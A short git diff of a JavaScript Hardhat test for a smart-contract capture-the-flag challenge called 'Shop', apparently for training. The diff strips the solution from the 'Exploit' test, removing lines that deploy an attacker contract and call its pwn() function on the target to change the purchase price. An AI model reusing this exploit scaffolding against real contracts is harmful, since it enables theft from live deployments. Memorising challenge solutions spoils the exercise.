@@ -26,12 +26,7 @@ describe('[Challenge] Shop', function () {
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const AngleBuyerFactory = await ethers.getContractFactory('AngleBuyer', attacker);
-        const AngleBuyer = await AngleBuyerFactory.deploy();
-        console.log(`\t price before: ${await this.target.price()}`);
-        console.log(`\t buying...`);
-        let buyTX = await AngleBuyer.connect(attacker).pwn(this.target.address); await buyTX.wait();
-        console.log(`\t price after : ${await this.target.price()}`);
+        
     }).timeout(0);
     
     after(async () => {
